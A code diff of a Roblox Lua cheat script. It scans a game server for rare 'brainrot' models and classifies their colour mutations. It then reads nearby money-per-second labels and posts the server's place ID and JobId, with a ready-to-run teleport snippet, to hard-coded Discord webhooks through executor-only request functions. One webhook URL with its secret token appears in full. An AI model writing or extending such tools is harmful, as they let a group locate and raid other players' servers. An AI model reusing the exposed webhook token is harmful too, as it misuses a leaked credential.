@@ -1689,9 +1689,7 @@ local Players = game:GetService("Players")
 local MarketplaceService = game:GetService("MarketplaceService")
 
 local allowedPlaceId = 109983668079237
-if game.PlaceId ~= allowedPlaceId then
-    return
-end
+if game.PlaceId ~= allowedPlaceId then return end
 
 local webhookUrls = {
     "https://discord.com/api/webhooks/1394493952777781339/WeA17Y-eTO2oAUux6QBg1kRB_xroGezesHAS5DQ-HR5exzeWzwCvEWDn8WXBso7GgYNK",
@@ -1709,145 +1707,123 @@ local brainrotGods = {
     ["Pot Hotspot"] = true,
     ["Las Tralaleritas"] = true,
     ["Torrtuginni Dragonfrutini"] = true,
+    ["Noobini Pizzanini"] = true,
 }
 
-local colorGold = Color3.fromRGB(237, 178, 0)
+local colorGold    = Color3.fromRGB(237, 178, 0)
 local colorDiamond = Color3.fromRGB(37, 196, 254)
-local colorCandy = Color3.fromRGB(255, 70, 246)
+local colorCandy   = Color3.fromRGB(255, 70, 246)
 local COLOR_EPSILON = 0.02
 
-local notifiedMutations = {}
+local notified = {}
 
-local function isValidPlayerCount()
-    local count = #Players:GetPlayers()
-    return count >= 3 and count <= 8
-end
-
-local function colorsAreClose(c1, c2)
-    return math.abs(c1.R - c2.R) < COLOR_EPSILON
-       and math.abs(c1.G - c2.G) < COLOR_EPSILON
-       and math.abs(c1.B - c2.B) < COLOR_EPSILON
-end
-
-local function findRootPart(model)
-    local root = model:FindFirstChild("RootPart") or model:FindFirstChild("HumanoidRootPart")
-    if root and root:IsA("BasePart") then
-        return root
-    end
-    for _, part in pairs(model:GetChildren()) do
+local function getPrimaryPart(model)
+    if model.PrimaryPart then return model.PrimaryPart end
+    for _, part in ipairs(model:GetDescendants()) do
         if part:IsA("BasePart") then
             return part
         end
     end
-    return nil
 end
 
-local function sendDiscordNotification(modelName, mutation)
-    local placeId = tostring(game.PlaceId)
-    local jobId = game.JobId
+local function matchesMoneyPattern(text)
+    return text and text:find("%$") and text:find("/") and text:find("s") and text:find("%d")
+end
 
-    local gameName = "Unknown"
-    pcall(function()
-        local info = MarketplaceService:GetProductInfo(game.PlaceId)
-        gameName = info and info.Name or "Unknown"
-    end)
-
-    local message = string.format(
-[[---- <@&1392894797831733329> ----
-
---- 📢 **Game:**  %s
---- 💡 Model Name: "%s | Mutation: %s"
-
-local player = game.Players:GetPlayers()[1]
-local teleportService = game:GetService("TeleportService")
-teleportService:TeleportToPlaceInstance("%s", "%s", player)
-]], gameName, modelName, mutation, placeId, jobId)
-
-    local data = {
-        ["content"] = message
-    }
-
-    local jsonData = HttpService:JSONEncode(data)
-    local headers = {
-        ["Content-Type"] = "application/json"
-    }
-
-    local request = (syn and syn.request) or (http and http.request) or request or http_request
-    if request then
-        for _, url in ipairs(webhookUrls) do
-            request({
-                Url = url,
-                Body = jsonData,
-                Method = "POST",
-                Headers = headers
-            })
+local function findNearbyMoneyText(position, range)
+    for _, guiObj in ipairs(Workspace:GetDescendants()) do
+        if guiObj:IsA("TextLabel") and matchesMoneyPattern(guiObj.Text) then
+            local base = guiObj:FindFirstAncestorWhichIsA("BasePart")
+            if base and (base.Position - position).Magnitude <= range then
+                return guiObj.Text
+            end
         end
     end
 end
 
-local function checkBrainrotModels()
-    if not isValidPlayerCount() then return end
+local function sendNotification(modelName, mutation, moneyText)
+    local placeId = tostring(game.PlaceId)
+    local jobId = game.JobId
+    local gameName = "Unknown"
 
-    for _, obj in pairs(Workspace:GetChildren()) do
-        if obj:IsA("Model") and brainrotGods[obj.Name] then
-            local root = findRootPart(obj)
+    pcall(function()
+        local info = MarketplaceService:GetProductInfo(game.PlaceId)
+        if info and info.Name then
+            gameName = info.Name
+        end
+    end)
+
+    local msg = string.format([[
+---- <@&1392894797831733329> ----
+
+--- 📢 **Game:** %s
+--- 💡 Model Name: "%s" | Mutation: %s
+--- 💸 Money/s: %s
+
+local player = game.Players:GetPlayers()[1]
+local teleportService = game:GetService("TeleportService")
+teleportService:TeleportToPlaceInstance("%s", "%s", player)
+]], gameName, modelName, mutation, moneyText or "N/A", placeId, jobId)
+
+    local payload = {content = msg}
+    local jsonData = HttpService:JSONEncode(payload)
+    local headers = {["Content-Type"] = "application/json"}
+
+    local req = (syn and syn.request) or (http and http.request) or request or http_request
+    if not req then return end
+
+    for _, url in ipairs(webhookUrls) do
+        pcall(function()
+            req({
+                Url = url,
+                Method = "POST",
+                Headers = headers,
+                Body = jsonData
+            })
+        end)
+    end
+end
+
+local function checkBrainrots()
+    local count = #Players:GetPlayers()
+    if count < 3 or count > 8 then return end
+
+    for _, model in ipairs(Workspace:GetChildren()) do
+        if model:IsA("Model") and brainrotGods[model.Name] then
+            local root = getPrimaryPart(model)
             if root then
-                local creationTime = root:GetAttribute("CreationTime")
-                if not creationTime then
-                    root:SetAttribute("CreationTime", tick())
-                elseif (tick() - creationTime) >= 1 then
-                    local key = obj:GetDebugId()
-                    local mutation = nil
+                local id = model:GetDebugId()
+                if not notified[id] then
+                    local mutation = "🕳️"
+                    local rc = root.Color
 
-                    -- Check root part color mutations
-                    local color = root.Color
-                    if colorsAreClose(color, colorGold) then
+                    if math.abs(rc.R - colorGold.R) < COLOR_EPSILON and math.abs(rc.G - colorGold.G) < COLOR_EPSILON and math.abs(rc.B - colorGold.B) < COLOR_EPSILON then
                         mutation = "🌕 Gold"
-                    elseif colorsAreClose(color, colorDiamond) then
+                    elseif math.abs(rc.R - colorDiamond.R) < COLOR_EPSILON and math.abs(rc.G - colorDiamond.G) < COLOR_EPSILON and math.abs(rc.B - colorDiamond.B) < COLOR_EPSILON then
                         mutation = "💎 Diamond"
-                    elseif colorsAreClose(color, colorCandy) then
+                    elseif math.abs(rc.R - colorCandy.R) < COLOR_EPSILON and math.abs(rc.G - colorCandy.G) < COLOR_EPSILON and math.abs(rc.B - colorCandy.B) < COLOR_EPSILON then
                         mutation = "🍬 Candy"
-                    end
-
-                    -- Check for any rainbow cube mutation (no names in message)
-                    local rainbowFound = false
-
-                    for _, child in pairs(obj:GetChildren()) do
-                        if child:IsA("MeshPart") and child.Name:sub(1,5) == "Cube." then
-                            local lastColor = child:GetAttribute("LastBrickColor")
-                            local currentColor = child.BrickColor.Color
-
-                            if lastColor then
-                                local lastVec = Vector3.new(lastColor.R, lastColor.G, lastColor.B)
-                                local currentVec = Vector3.new(currentColor.R, currentColor.G, currentColor.B)
-                                if (lastVec - currentVec).Magnitude > 0.01 then
-                                    rainbowFound = true
-                                end
+                    else
+                        for _, c in ipairs(model:GetChildren()) do
+                            if c:IsA("MeshPart") and c.Name:sub(1,5)=="Cube." then
+                                mutation = "🌈 Rainbow"
+                                break
                             end
-
-                            child:SetAttribute("LastBrickColor", currentColor)
                         end
                     end
 
-                    if rainbowFound then
-                        mutation = "🌈 Rainbow"
-                    end
-
-                    local finalMutation = mutation or "🕳️"
-                    local notifyKey = key .. "|" .. finalMutation
-                    if not notifiedMutations[notifyKey] then
-                        sendDiscordNotification(obj.Name, finalMutation)
-                        notifiedMutations[notifyKey] = true
-                    end
+                    local money = findNearbyMoneyText(root.Position, 20) or "N/A"
+                    sendNotification(model.Name, mutation, money)
+                    notified[id] = true
                 end
             end
         end
     end
 end
 
-task.delay(0.5, function()
+task.spawn(function()
     while true do
-        pcall(checkBrainrotModels)
+        pcall(checkBrainrots)
         task.wait(0.5)
     end
 end)
